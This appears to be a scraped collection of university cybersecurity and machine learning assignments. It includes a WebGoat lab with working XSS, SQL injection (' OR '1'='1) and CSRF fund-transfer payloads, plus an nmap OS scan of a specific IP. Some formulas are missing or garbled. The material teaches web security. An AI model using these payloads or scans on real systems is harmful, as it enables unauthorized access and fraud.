You may assume that before processing the request, the bank’s server calls login and ensures that the returned Result object contains exactly one userID. If this check fails, the bank will then fail the request. What is important for this question is that the result will be sent if the Result object contains exactly one userID.
What username can an attacker enter into the text field in order to issue a request as user “Admin” without having to know the password?



What username can an attacker enter into the text field in order to delete the Customers table?




Now, rewrite the login function using prepared statements. You may assume that there exists a PreparedStatement function called setString().




(12 points) Consider the following code snippet of a buffer overflow example and (i) identify at least one potential coding error specific to buffer overflow and explain why/how it can exploited (not just buffer overflow, but where the problem will manifest itself), and (ii) suggest a specific solution (such as a code change or other ideas discussed) to prevent or mitigate the impact of this deficiency.
char src[9];
char dest[9];
char* base_url = ""www.ru.nl"";
strncpy(src, base_url, 9);
// copies base_url to src
strcpy(dest, src);
// copies src to dest






(10 points) A security expert has made the claim that buffer overflow attacks (i.e., stack smashing) are made possible due to the fact that stacks grow downward on most popular architectures. Therefore, future development should ensure that the stack grows upwards, not downwards to provide a good defense against buffer overflow. Do you agree or disagree with this premise? Why?






(12 points) Suppose you are writing a new web database application. Identify and briefly describe at least two approaches you can take to protect yourself against SQL injection attacks. Note that this question is asking for approaches to “prevent” an SQL injection attack, not “mitigate” the impact.




 (33 points) In this problem, you will visit Google’s cross-site scripting site https://xss-game.appspot.com/ to give you the opportunity to find and exploit XSS vulnerabilities. Complete the first three levels of this XSS game and in doing so, (1) show your code or what you typed in the input field or URL bar to exploit the vulnerability, and then (2) describe the vulnerability and how it can be exploited in 2-3 sentences.
You may view the target code and use any of the hints provided in each level for help and insight into the potential vulnerability.
Level 1: Hello, world of XSS






Level 2: Persistence is key






Level 3: That sinking feeling…




"
"['web application', 'web', 'buffer overflow', 'cross site scripting', 'application', 'click', 'web applications', 'cross site', 'buffer overflows', 'buffer', 'cross site request', 'tom cat', 'webgoat', 'buffer overflow attacks', 'proxy manual edit', 'site', 'attach a screenshot', 'select tom cat', 'overflow', 'information gathering', 'site request forgery', 'user', 'information', 'site scripting', 'web page']",The University of North Texas,SECURE ECOMMERCE,5560,Cybersecurity Attacks 3,Lab,"Lab 2: Information Gathering and WebGoat Attacks Lab

This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: 
Username: 	osboxes
Password: 	osboxes.org

Information Gathering
Before attacking (i.e., pen testing) a website, we need to gather some important value to map the attack surface. If we don't understand how the site is working, what is available on the site, what type of input it takes etc., then we will not be able to launch a good attack.
Gathering information and mapping the site is very important, so you will be given a basic understanding of a few tools that can be used but you will need to dig deeper to attack a system.
Lab Tasks
nslookup (Name Server Lookup) is the name of a program that lets an Internet server administrator, or any computer user enter a host name. You may access nslookup using the Terminal Emulator.
Only if nslookup is not installed:
⦁	sudo apt-get update
⦁	sudo apt-get install dnsutils

nslookup followed by the domain name will display the ""A Record"" (IP Address) of the domain. Use this command to find the address record for google.com:
> nslookup google.com

Q1: Attach a screenshot of your results from this nslookup command.




We can also view all the available DNS records using the -type=any option.
> nslookup -type=any google.com

Q2: Attach a screenshot of your results from this nslookup command. Since there can be a lot of information presented here, only include the actual data between the server/address (found in the earlier query) and the authoritative answers (where there should be several authoritative answers that start with google.com).
 



Q3:	Does the information help you as an attacker? If yes, how? Otherwise, if no, why?  

nmap (Network Mapper) is a security scanner used to discover hosts and services on a computer network, thus creating a ""map"" of the network. To accomplish its goal, nmap sends specially crafted packets to the target host and then analyzes the responses.
The software provides several features for probing computer networks, including host discovery and service and operating system detection. These features are extensible by scripts that provide more advanced service detection, vulnerability detection, and other features. nmap is also capable of adapting to network conditions including latency and congestion during a scan.
Only if nmap is not installed:
⦁	sudo apt-get install nmap
Now, let’s find our gateway’s open ports as well as OS name and version using nmap. Note that this command requires root privileges.
> sudo nmap -O -v 129.120.210.235

Q4: Attach a screenshot of your results from this nmap command.

Q5: Does the information help you as an attacker? If yes, how? Otherwise, if no, why? 

References: 
1) http://www.debianhelp.co.uk/nslookup.htm 
2) http://nmap.org/nmap_doc.html 

Webgoat

⦁	Type the docker command to start the web server as shown below:
> docker run -p 8080:8080 -t webgoat/webgoat-7.1

 


⦁	You will then get a web server started (no additional command here):

 

Normally, you should see a message as above if WebGoat’s Apache Tomcat server started successfully. Occasionally, the notifications as above are not shown, so please proceed with the next command, regardless of whether you see the notifications or not.

Type: ""localhost:8080/WebGoat/login.mvc"" in the browser address bar to start WebGoat.

Default passwords are shown on the below screenshot:

 

Use the ""guest"" login to start WebGoat.

 



CROSS SITE SCRIPTING 

Select the following option in the WebGoat left hand menu:
Cross Site Scripting  LAB: Cross Site Scripting
 
	
Login as user Tom Cat (employee) where password is ""tom"" in the above page. You should then see the following page or similar.

 

Select Tom Cat (employee) and then click on View Profile. Now click on Edit Profile to see the following screen.

 


Now go to Applications  03 – Web Application Analysis and run application webscarab.
 

This application is used to manipulate the data being sent using the HTTP ""POST"" method. After opening webscarab, you should see the following screen:

 
Go to Proxy  Manual Edit and select Intercept requests.
 
Go to Proxy  Listeners and observe the port and address (in the case shown, it is 127.0.01 and 8008).
 
Now go to your browser (for WebGoat) and open Preferences in the menu.
 

Under General, scroll down to find Network Settings and then click on Settings.
 
Enter the settings as below and, if applicable, remove any text in No proxy for box. Enter the address (127.0.0.1) and port number (8008) from webscarab and click OK.

 

In the browser URL location, type ""about:config"" and hit enter as shown below.
 
Click on ""Accept Risk and Continue"". 
In the next window, click on ""Show All"". 
 
In the search bar, type ""network.proxy.allow_hijacking_localhost"", as shown below. You will see the field set to ""false"". Click on the button (highlighted in red below) to switch it to ""true"".
 
The field will now be set to ""true"".
 
Now, click on Update Profile of Tom Cat (employee).
A window pops up showing all the fields in ""Update Profile"" form. Append the following JavaScript to the address1 field: <script>alert(""XSS"");</script>
 
Click Accept Changes.
 

Click OK on the XSS alert. Now, go to webscarab and uncheck the Intercept requests box under Proxy  Manual Edit.
Then, log out as Tom Cat (employee).

Now, let’s login as another user and see if the JavaScript we have added works when we view Tom’s profile.
Login as Jerry Mouse (hr) where password is ""jerry"". Select Tom Cat (employee) and View Profile. 

 
We should see an alert dialog, saying ""XSS"". This confirms that our script runs when another user is logged in. Using this attack, an attacker can steal user information from the cookies of a victim. 
Click OK on the XSS alert and logout as Jerry Mouse (hr).
Turn off intercept until needed to process the web requests without delay.
Q6: Attach a screenshot of your results showing the lab was successful (with the XSS alert logged in as Jerry Mouse (hr). 

SQL INJECTION 

SQL Injection is a technique to inject attack code into the SQL queries that run on the server. One simple attack is to inject an attack string to achieve unauthorized access to a user’s account. 
Select the following option in the WebGoat left hand menu:
Injection Flaws  LAB: SQL Injection  Stage 1: String SQL Injection
 

Start the intercept in webscarab:
Go to Proxy  Manual Edit and select Intercept requests.

In WebGoat, select the admin (last user on the list). We will see how an attacker can login to a vulnerable web application without providing the password. Click Login on the web application and this request is trapped the webscarab as follows: 

Now tamper the password as follows: 
Set password as <any string>' OR '1'='1. As an example, we set our password as: PWNED' OR '1'='1.
 

Click Accept changes and Stop intercepting 
You should be now logged in as the administrator. To verify your admin rights, try viewing any profile. 
Click Logout to logout as admin.
Q7: Attach a screenshot of successful completion of task.

CROSS SITE REQUEST FORGERY 
CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user.  If the targeted end user is the administrator account, this can compromise the entire web application.

Select the following option in the WebGoat left hand menu: 
Cross Site Scripting (XSS)  Cross Site Request Forgery (CSRF) 
 

In the ""Title:"" field, enter a unique title to grab the victims’ attention such as ""Free Kittens"".
Be sure the Title is unique by including your EUID so we know the submitted solution is yours.
In the ""Message: "" field, you will need to load an HTML image where the image is actually empty and a ""transferFunds"" parameter is loaded with an arbitrary value as follows:
<img src='attack?Screen=2078372&menu=900&transferFunds=5000'>
Then click the ""Submit"" button.
 
(Note: the Screen and menu parameters come from the page source)


You should now scroll down to see your new entry in the Message List below:
 


Clicking on your message should cause your message to load on the victim webpage pulling in your exploit code and revealing a green check box next to the WebGoat Cross Site Request Forgery (CSRF) menu option revealing successful completion of this task. (You may need to refresh the page to get the check box.)

 

Q8: Attach a screenshot showing the lab is successful.

BUFFER OVERFLOW
A buffer overflow occurs when a program or process tries to store more data in a buffer (temporary data storage area) than it was intended to hold. Since buffers are created to contain a finite amount of data, the extra information - which has to go somewhere - can overflow into adjacent buffers, corrupting or overwriting the valid data held in them. Although it may occur accidentally through programming error, buffer overflow is an increasingly common type of security attack on data integrity. In buffer overflow attacks, the extra data may contain codes designed to trigger specific actions, in effect sending new instructions to the attacked computer that could, for example, damage the user's files, change data, or disclose confidential information.  There are many variations of the buffer overflow but for this lab we will focuses on web applications. 
Buffer Overflow and Web Applications
Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code – effectively taking over the machine.
Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks.
Buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application are normally not available to the hacker.
Consequences 
⦁	Category: Availability: Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
⦁	Access control (instruction processing): Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program’s implicit security policy.
⦁	Other: When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
Exposure period
⦁	Requirements specification: The choice could be made to use a language that is not susceptible to these issues.
⦁	Design: Mitigating technologies such as safe-string libraries and container abstractions could be introduced.
⦁	Implementation: Many logic errors can lead to this condition. It can be exacerbated by lack of or misuse of mitigating technologies.

Select the following option in the WebGoat left hand menu: 
Buffer Overflows  Off-by-One Overflows 
A web page will be displayed; the web page is simulating a room booking.

 
What you need to do
⦁	You will enter arbitrary details. 
First Name	A
Last Name	A
Room Number	Over 6000 A’s or any characters as shown below 
 

⦁	 Click ""Submit"" and then ""Accept Terms"".

 

⦁	Right click on the page and select ""Inspect Element (Q)"" you will be able to see hidden form fields. Remove the type=""HIDDEN"" parameters for all of the guests.
 

⦁	After deleting the parameter type=""HIDDEN"" you will be able to see details of your input data on the web page. Remember the other guest’s information (i.e., First Name, Last Name, Room Number).

 

⦁	Click on ""Restart Lesson"" and give these room details for one of the users to complete the task. (You can use any of the other member room details.)
 

Q9:	What is John Smith’s room number? Attach a screenshot of the web page showing the details.


"
"['irvine machine learning', 'california irvine machine', 'project', 'glass identification dataset', 'machine learning', 'university of california', 'california irvine', 'irvine machine', 'class', 'windows', 'float', 'processed', 'glass identification', 'google colab', 'pre-processing for project', 'identification dataset', 'features', 'feature', 'dataset', 'number', 'class attribute', 'pre-processing', 'feature information', 'canvas', 'identification']",The University of North Texas,MACHINE LEARNING,5215,Data Preprocessing,Homework,"Pre-Processing for Project 1
The dataset that will be used for this project is the Glass Identification dataset. Here is a description of the data which is taken from the University of California Irvine Machine Learning (UCI ML) repository.
Number of Instances: 214

6. Number of Features: 10 (including an Id#) plus the class attribute
   -- all features are continuously valued

7. Feature Information:
   1. Id number: 1 to 214
   2. RI: refractive index
   3. Na: Sodium (unit measurement: weight percent in corresponding oxide, as 
                  are attributes 4-10)
   4. Mg: Magnesium
   5. Al: Aluminum
   6. Si: Silicon
   7. K: Potassium
   8. Ca: Calcium
   9. Ba: Barium
  10. Fe: Iron
  11. Type of glass: (class attribute)
      -- 1 building_windows_float_processed
      -- 2 building_windows_non_float_processed
      -- 3 vehicle_windows_float_processed
      -- 4 vehicle_windows_non_float_processed (none in this dataset)
      -- 5 containers
      -- 6 tableware
      -- 7 headlamps

Use the following syntax to load the file:


columns = ['RI','Na', 'Mg', 'Al', 'Si', 'K', 'Ca', 'Ba','Fe','Type']
df = pd.read_csv('https://archive.ics.uci.edu/ml/machine-learning-databases/glass/glass.data',
                 names=columns, header=None)



Requirements:
Use the “PreprocessingTutorial” document placed in Canvas as a guide. You may also use reference material from the Internet. However, you are not allowed to collaborate with others in the class or outside it.
You are required to perform the following analysis and visualizations on the data. These should be performed in a Google Colab notebook:
Partitioning the dataset into separate training and testing sets
Normalize the features using min-max scaling
Obtain summary statistics such as mean, standard deviation, etc for each feature
Plot a scatter plot for each predictor feature against the class feature
Based on the analysis and visualizations performed, what would be the top 3 features in terms of their importance to the classification process?

Hand in: Submit a copy of your Google Colab code for through the Project 1 Part A link in Canvas. This submission must be done on or before the stated deadline which is the end of class on Week2. 
"
"['document in canvas', 'text document', 'form of submission', 'points', 'password', 'access', 'due', 'march', 'pdf', 'word', 'wednesday', 'form', 'canvas', 'credit cards', 'credit card', 'text', 'document', 'human', 'human failure', 'credit', 'authentication', 'access control', 'passwords', 'situation', 'card']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Data Security,Homework,"Homework 4
Due: 11:59 PM on Wednesday, March 30, 2022
Form of submission: PDF, Word, or Text Document in Canvas
	
(8 points) List three reasons people might be reluctant to use biometrics for authentication. Can you think of ways to counter those objections?



(12 points) ""Magnetic swipe"" (or magnetic strip) credit cards are activated by swiping it through a device that can read the data in the stripe. Credit card skimming (i.e., credit card fraud) can be achieved by fitting a small, illegal device on top of real card readers at self-service sale terminals.
Briefly describe two ways that can make credit cards more secure.


Identify two reasons why have banks not made them even more secure? 


(8 points) False-positive and false-negative rates can be adjusted, and they are often complementary: lowering one raises the other. List two situations/scenarios in which false negatives are significantly more serious than false positives.


(8 points) In a typical office, biometric authentication might be used to control access to employees and registered visitors only. We know the system will have some false negatives, some employees falsely denied access, so we need a human override, someone who can examine the employee and allow access in spite of the failed authentication. Thus, we need a human guard at the door to handle problems as well as the authentication device; without biometrics, we would have had just the guard. Consequently, we have the same number of personnel with or without biometrics, plus we have the added cost to acquire and maintain the biometrics system. Explain the security advantage in this situation that justifies the extra expense.




(8 points) If you forget your password for a website and you click [Forgot my password], sometimes the company sends you a new password by email, but sometimes it sends you your old password by email. Compare these two cases in terms of vulnerability of the website owner.



(12 points) Humans are said to be the weakest link in any security system. Give an example for each of the following:
(a) 	A situation in which human failure could lead to a compromise of encrypted data


(b) 	A situation in which human failure could lead to a compromise of identification and authentication


(c) 	A situation in which human failure could lead to a compromise of access control


(12 points) Password Managers
What is a password manager and why is it useful?



What security risks are associated with password managers?



(8 points) File access control relates largely to the secrecy dimension of confidentiality. What is the relationship between an access control matrix and the integrity of the objects to which access is being controlled?




(12 points) Suppose you manage a web site that stores a database of usernames and passwords. Valid passwords contain only letters a – z, A – Z, and digits 0 – 9, and are exactly 8 characters long. You incorporated some basic defenses by storing SHA-256 hashes instead of the plaintext passwords, but unfortunately, an attacker stole the database. Assuming the attacker is able to process 4 million SHA-256 passwords per second, how many hours on average would it take for the attacker to crack a single password by brute force?



(12 points) We have seen that online password guessing attacks are detectable (e.g., your bank may shut down online access to your account after n failed login attempts). Given that web sites (i.e., applications) have many components and vulnerabilities can be found on the client side, server side, as well as the communication channel, describe two ways that an attacker may circumvent this lockout? Be creative, but specific.


"
"['document in canvas', 'text document', 'form of submission', 'query', 'user', 'describe', 'database', 'sensitive', 'users', 'describe a situation', 'due', 'april', 'pdf', 'word', 'friends', 'thursday', 'form', 'canvas', 'text', 'document', 'records', 'aggregate is greater', 'sensitivity', 'make', 'data']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Database Security,Homework,"Homework 7
Due: 11:59 PM on Thursday, April 28, 2022
Form of submission: PDF, Word, or Text Document in Canvas

⦁	Consider the following questions regarding the data aggregation:
⦁	Describe a situation in which the sensitivity of an aggregate is greater than that of its constituent values.




⦁	Describe a situation in which the sensitivity of an aggregate is less than that of its constituent values.




⦁	One approach suggested to ensure privacy is the small result rejection, in which the system rejects any query whose result returns a small number (e.g., where n = 5, for example). Describe the process how an attacker might be able to obtain sensitive data by using only queries derived from six records.





⦁	The response to a query “sensitive value; response suppressed” is itself a disclosure. One possible measure to suppress responses that reveal sensitive information without disclosing that the responses to certain queries are sensitive is to use random data suppression, where the database management system periodically suppresses the response to a particular query that was not sensitive. In this case, the user would not know if it was because of random suppression or sensitive data. Describe how this approach might fail.





⦁	Suppose that you create a new privacy-conscious social network called PrivateFriends whose data consists of a dataset called Users that contains a record with the ID, name, age, interests (i.e., things a user likes), and list of friends. Friendships on PrivateFriends are two-way, meaning that if user A is friends with user B, then user B is friends with user A. The ages of all the users are between 0 (yes, infants want private friends in this day and age) and 80, inclusively, and each user can only have up to 50 friends, inclusively. If a user is removed from the network, then that user no longer appears in any list of friends.
Of course, you are concerned about the differential privacy as your advertisers make queries on your Users dataset. Suppose that we define the sensitivity of a function  on datasets  and  as , where the maximum is over all pairs of sets in  and  that differ in at most one element. Recall that  and  can only differentiate by at most one row, when a user is added or removed. For each of the queries listed below on Users, compute the sensitivity . If the sensitivity is not bounded by a constant given in the problem, write ""not bounded"".
⦁	





⦁	





⦁	





⦁	




⦁	Consider the following database table:
 
A normal user may not query the database on the field Name and may only use formulas such as , , , , , and . The database is protected with the query size restriction technique for each operation (e.g., ,  , etc.) with , in that no individual query operation that matches fewer than  or more than  will be answered, where  is the size of the database table. This means that a query operation resulting in 1 record or more than 11 (i.e., ) will be rejected.
Formulate your query in the following format:
⦁	 is the characteristic formula, such as .
⦁	 is a specific attribute, such as .
Then, using the values above, the query  is acceptable since it is based on two entries. Since , the query with  where  and  would be rejected since the result is based on one match.
⦁	Use a query with exactly two query operations and demonstrate how the tracker attack could be used to find the exact salary of Professor Dodd assuming that the attacker knew that Professor Dodd is the only female CS professor. This is the only external information that the attacker has, and you cannot make any other assumptions about the values in the database. This means that you should have two characteristic formulas,  and , and one attribute, , expressed something like , for example.


⦁	BONUS: Now assume that the database consists solely of the six entries from the CS department, such that . Rewrite your query from (a) above so that it does not violate the query size restriction technique for , meaning that all query operations should have between 2 and 4 results, inclusively. Note that if your answer to (a) above satisfies this requirement, simply rewrite it here again so that the graders will know to give credit for the bonus.


⦁	Suppose that a telephone company maintains records on every telephone call it handled, showing the calling phone number, the called phone number, and the time, date, and duration of the call.
⦁	What uses might the telephone company make of those records?



⦁	What uses might commercial marketers make of those records?



⦁	What uses might a rival telephone company make of those records?



⦁	What uses might a government make of those records?



⦁	Which of those uses violates individuals’ privacy rights?


"
"['points', 'internet', 'describe', 'web', 'information asymmetry', 'http', 'web site', 'due', 'february', 'tuesday', 'information', 'search engines', 'e-commerce', 'site', 'search', 'dns', 'html', 'asymmetry', 'switching', 'information asymmetry existed', 'engines', 'merchants', 'packet switching', 'reduces information asymmetry', 'customers']",The University of North Texas,SECURE ECOMMERCE,5560,Ecommerce Overview HTTP,Homework,"Homework 1
		Due: 11:59 PM on Tuesday, February 1, 2022.
Please answer in your own words and show any and all work.

(10 points) In traditional commerce, information asymmetry existed between the seller and buyer.
Describe how does electronic commerce reduces information asymmetry and provide a clear example of this.



How have merchants been able to maintain a sense of balance in this power relationship now that consumers have leveled the playing field (i.e., what have merchants done or what can they do to keep customers coming back related specifically to information asymmetry)? Provide at least two ways merchants do this.



(10 points) We discussed in class that third generation e-commerce technologies added the capability for customers to find information about companies, products, and services through the use of search engines. The search engines themselves make use of web crawlers to find and index available web pages, which increases the likelihood of potential customers finding out about web sites.
State one valid reason why an owner of a web site might not want to have a web crawler access his/her web site.



E-commerce sites use markup languages such as HTML and XML as part of their infrastructure for message and information distribution. These tags can simplify the job of search engine by providing context to the site’s content, such as clarifying which of several meanings of a particular word is the relevant one. What is one major downside of search engines relying on this page content?



(10 points) Answer the following questions about classful and classless (i.e., CIDR) IP addresses.
Using classful IP addressing, identify the class (i.e., A, B, C, D, or E), the prefix, and suffix of the IP address 172.16.52.63.




In general, how many host addresses are available for use in a class C network using classful IP addressing?




Consider the IP address 135.46.60.0/22 in a classless (i.e., CIDR) implementation. How many possible host addresses are available for use in this network?




(10 points) To save some money, an organization is considering developing a solution that offers security only at the physical layer of the TCP/IP model and not other layers since all the traffic must go through this layer. Is this a good idea? Why or why not?




(10 points) What is DNS and what role does it play in the Internet and E-Commerce? On October 21, 2016, Dyn, Inc., an Internet infrastructure company that provides DNS and other services, sustained a distributed denial of service (DDoS) attack that took down a significant portion of the Internet on the U.S. East Coast. What would be the effect if all DNS servers were taken offline by a DDoS attack? Be specific.




(10 points) HTTP is considered to be a stateless protocol.
What does it mean that HTTP is stateless?



Describe how you can make HTTP to be stateful?



Give two benefits of making HTTP stateful.



(10 points) The Internet has mainly evolved using the 5-layer TCP/IP model architecture based on the 7-layer OSI model.
Why is this layered approach important (i.e., identify and describe at least one advantage of the layered architecture approach)?



Identify and describe at least one disadvantage of the layered architecture approach.



(10 points) As a key Internet technology, describe the importance of packet switching to the Internet, which has in turn benefited the growth of e-commerce. As a hint, you may want to compare packet switching to circuit switching and describe why packet switching is more beneficial to support the growth of e-commerce.



(10 points) HTTP supports cache coherence. The If-Modified-Since header is used to check if the resource has been changed, and thus if the cache page is still valid. Since client requests can be made for pages containing multimedia, such as images, video, sound, and so forth, in addition to HTML, describe the effectiveness of using the If-Modified-Since header for HTML versus JPEG images (i.e., which one performs better with this technique and why?).





(10 points) What is meant by a static web page? Briefly describe at least two disadvantages of building a web site using static pages. Are there any advantages? If so, list at least two of them

"
"['foundations of cybersecurity', 'cybersecurity spring', 'foundations', 'spring', 'cybersecurity', 'aaaa', 'input file', 'output', 'output file', 'csce', 'file', 'aaaa aaaa', 'input', 'key input file', 'input key file', 'output ciphertext file', 'step', 'input files', 'input plaintext file', 'key file', 'bit', 'rijndael ’s galois', 'wvog', 'ymgh', 'key']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Encryption System Development,Project,"CSCE 3550 Foundations of Cybersecurity Spring 2022
1
Project 3
Due: 11:59 PM on Tuesday, May 3, 2022
For Project 3, you will implement an encryption system in any programming language supported 
on our Linux CSE machines using a modified, simplified version of AES (Advanced Encryption 
System) on our CSE machines that will (1) read the plain text from a file and a key from another file; 
(2) encrypt the plain text according to the requirements detailed below; and (3) write the output for 
each step to the screen and to an output file. Your source code must be sufficiently commented to 
explain your program. At a minimum, you should comment the header (e.g., name, class date, brief 
description of the program), all variables (i.e., what each variable is used for), and specific “blocks” 
of code. This applies to all user-defined functions as well. For example, use comments to describe the 
inputs, the formulas used, and any other important steps in your code. Be sure to handle any 
applicable error conditions in your code (e.g., if there is a problem opening the file, etc.).
1. Input Files
Your program will prompt the user to enter the name of the input file containing the plain text 
that will be encrypted (i.e., the plaintext input file) as well as the name of the input file containing 
the key that will be used in the encryption process (i.e., the key input file).
The input file containing the plain text will consist solely of uppercase letters (e.g., A – Z), 
punctuation, and whitespace characters. Lines will not be longer than 80 characters, but the 
number of lines in the file is not known.
• Example plain text in an input file:
ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW.
The file containing the key will contain the key consisting of exactly 16 uppercase letters given in 
a single line.
• Example of a key in a key file:
SIMPLEEXAMPLEKEY
2. Output File
Your program will prompt the user to enter the name of the output file containing the output of 
each step of the encryption algorithm. 
Your program will write the output of each step of the encryption algorithm in the output file. 
First, write the name of the step on a separate line, and then write the output of that particular 
step. If the output in a particular step is manipulate as blocks of 4 × 4, then it should appear as 
blocks of 4 × 4 in the output file. Make sure that immediately after each step, you write the data 
in the output file and save the file. If you do not do this and your program crashes, then there will 
be no output produced, so partial credit will be limited.
CSCE 3550 Foundations of Cybersecurity Spring 2022
2
3. Encryption Algorithm
The encryption algorithm shall consist of two parts: (1) substitution, and (2) encryption on blocks 
of size 4 × 4 characters. The detailed description of the steps is as follows:
a) Preprocessing
Remove any punctuation and whitespace characters from the input.
o Example:
Input Text: ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW.
Output Text: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW
b) Substitution
Perform a polyalphabetic substitution using the Vigenère cipher on the input file with the 
key provided in the key input file.
o Example:
Key: SIMPLEEXAMPLEKEY
Input Text: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW
Output Text: WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO
c) Padding
Steps d) – f) are performed on blocks of size 4 x 4 characters formed from the output of 
step b (i.e., substitution). They are parts of AES and as in any block cipher, the input has 
to be padded. In this particular case, pad the output from the previous step with A’s so 
that the length of the message is divisible by 16.
o Example:
Input: Output:
WVOG WVOG
JTXQ JTXQ
HUHX HUHX
ICWY ICWY
YMGH YMGH
TRKQ TRKQ
HQPW HQPW
KYVG KYVG
LPYS LPYS
PWGO PWGO
INTO INTO
FOPM FOPM
O OAAA
AAAA
AAAA
AAAA
CSCE 3550 Foundations of Cybersecurity Spring 2022
3
d) ShiftRows
This step is the same as the ShiftRows step in the AES encryption. Circularly shift the 
rows in each block in the following fashion: The first row remains the same. Shift the 
second row one position to the left. Shift the third row two positions to the left. Finally, 
shift the fourth row three positions to the left.
o Example:
Input: Output:
WVOG WVOG
JTXQ TXQJ
HUHX HXHU
ICWY YICW
YMGH YMGH
TRKQ RKQT
HQPW PWHQ
KYVG GKYV
LPYS LPYS
PWGO WGOP
INTO TOIN
FOPM MFOP
OAAA OAAA
AAAA AAAA
AAAA AAAA
AAAA AAAA
e) Parity Bit
Convert each character to its numeric value (0 – 127) and use the most significant bit as a 
parity bit.
o Example:
The numeric value of ‘A’ is 65!"" = 01000001# = 41!$. There is an even number of 
ones in its binary representation, so the most significant bit stays unchanged. 
However, the numeric representation of ‘C’ is 67!"" = 01000011#. In this case, 
since there is and odd number of ones (i.e., three) in the binary representation, the 
most significant bit will be set to one in order to have an even number of ones in the 
binary representation, i.e., ‘C’ with added parity will be 11000011# = 195!"" =
c3!$.
Input: Output (in hexadecimal):
WVOG d7 56 cf 47
TXQJ d4 d8 d1 ca
HXHU 48 d8 48 55
YICW 59 c9 c3 d7
YMGH 59 4d 47 48
RKQT d2 4b d1 d4
PWHQ 50 d7 48 d1
GKYV 47 4b 59 56
LPYS cc 50 59 53
WGOP d7 47 cf 50
CSCE 3550 Foundations of Cybersecurity Spring 2022
4
TOIN d4 cf c9 4e
MFOP 4d c6 cf 50
OAAA cf 41 41 41
AAAA 41 41 41 41
AAAA 41 41 41 41
AAAA 41 41 41 41
f) MixColumns
This step diffuses the data and is the same as the MixColumns step in the AES 
encryption. The transformation is performed by multiplying the circulant MDS matrix 
with each column from the input (i.e., the output of step e) as shown below. This 
transformation is repeated for each block.
,
2 3
1 2
1 1
3 1
1 1
3 1
2 3
1 2
. × ,
�""
�!
�#
�%
. = ,
�""
�!
�#
�%
.
However, instead of simple multiplication, it uses multiplication in the Rijndael’s Galois 
field. But this is not as difficult as it sounds since this transformation matrix only contains 
the numbers 1, 2, and 3. Therefore, you will only multiply with 1, 2, and 3.
o Example:
Let’s assume that you want to multiply the eight bit number � = 10101111# with 
2!"" = 00000010# and 3!"" = 00000011# in Rijndael’s Galois field. The 
multiplication would be done in the following manner:
Multiplication with 2:
� × 2 = 10101111 ≪ 1 = 01011110, where ≪ is left shift and ‘1’ is the number 
of places to be shifted. This is the easiest way to multiply a number by 2. Notice that 
the most significant bit (MSB) of x, which is 1, is dropped. Because the MSB of x is 
1 the result has to be XORed with 00011011. Then, 01011110 ⊕ 00011011 =
01000101.
Multiplication with 3:
Since 3 can be represented as a sum of 2 and 1, the multiplication is performed as 
� × 3 = � × (2 + 1) = � × 2 + �. However, in Rijndael’s Galois field, addition 
is done with the XOR operation, so the multiplication would be � × 3 = � ×
2 ⨁ �. So � × 3 = � × 2 ⨁ � = 10101111 ≪ 1 ⊕ 10101111 = 01011110 ⊕
10101111 = 11110001. Again, if the highest bit of x is zero, then we are done. 
Otherwise, the result has to be XORed with 00011011 as before. In this case, since 
the MSB bit of x is 1, the final result is 11110001 ⊕ 00011011 = 11101010.
A suggestion would be to implement a function that performs multiplication on an 
eight bit binary representation of a number x with y (that can take a value of 2 or 3) as 
in rgfMul(x, y).
In Rijndael’s Galois field, addition is performed using the XOR operation ⊕. Therefore, 
the matrix multiplication in Rijndael’s Galois field becomes:
CSCE 3550 Foundations of Cybersecurity Spring 2022
5
rgfMul(c0,2) ⊕ rgfMul(c1,3) ⊕ c2 ⊕ c3 = a0
c0 ⊕ rgfMul(c1,2) ⊕ rgfMul(c2,3) ⊕ c3 = a1
c0 ⊕ c1 ⊕ rgfMul(c2,2) ⊕ rgfMul(c3,3) = a2
rgfMul(c0,3) ⊕ c1 ⊕ c2 ⊕ rgfMul(c3,2) = a3
o Example:
Let’s take a look at how the first mix columns transformation is done using the first 
four entries in the first input column (in blue input) where �"" = d7, �! = d4, �# =
48, and �% = 59. We then perform the mix columns transformation as such for the 
first four entries in the output column (in green output):
,
2 3
1 2
1 1
3 1
1 1
3 1
2 3
1 2
. × ,
d7
d4
48
59
. = ,
c3
e5
78
4c
.
We break this out to see exactly how we obtain the value c3 in the output, which is 
made up of (2 × �7) + (3 × �4) + (1 × 48 ) + (1 × 59) (in red above).
2 × �7 = 11010111 ≪ 1 = 10101110 ⊕ 00011011 = 10110101
3 × �4 = (11010100 ≪ 1) + 11010100 = 10101000 ⊕ 11010100
= 01111100 ⊕ 00011011 = 01100111
1 × 48 = 01001000
1 × 59 = 01011001
We can simply XOR all of these values together: 10110101 ← 2 × �7
⊕ 01100111 ← 3 × �4
11010010
⊕ 01001000 ← 1 × 48
10011010
⊕ 01011001 ← 1 × 59
11000011 = �3
Input: Output (in hexadecimal):
d7 56 cf 47 c3 ce 66 49
